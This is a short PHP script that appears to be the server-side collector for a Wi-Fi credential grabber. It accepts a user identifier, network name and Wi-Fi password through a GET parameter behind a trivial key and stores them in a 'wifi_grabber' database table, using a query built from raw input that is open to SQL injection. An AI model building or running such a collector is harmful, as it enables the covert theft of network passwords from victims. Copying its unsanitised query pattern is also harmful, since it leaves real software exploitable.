<?php
include "connect.php";

if(isset($_GET["key"]) and $_GET["key"] == "1"){
  $data = $_GET["data"];
  list($user, $wifiName, $wifiPass) = explode("*", $data);

  $c = new Connect();
  //DATABASE == grabber
  $conection = $c->returnConn("grabber");
  if($conection){
    $query = "insert into wifi_grabber(identifier, wifi_name, wifiPass) values ('$user', '$wifiName', '$wifiPass' ); ";
  $c->writeSql($conection, $query);
  }
}
elseif ($_GET["key"] == "2") {
  // code...
  // in production
}
?>
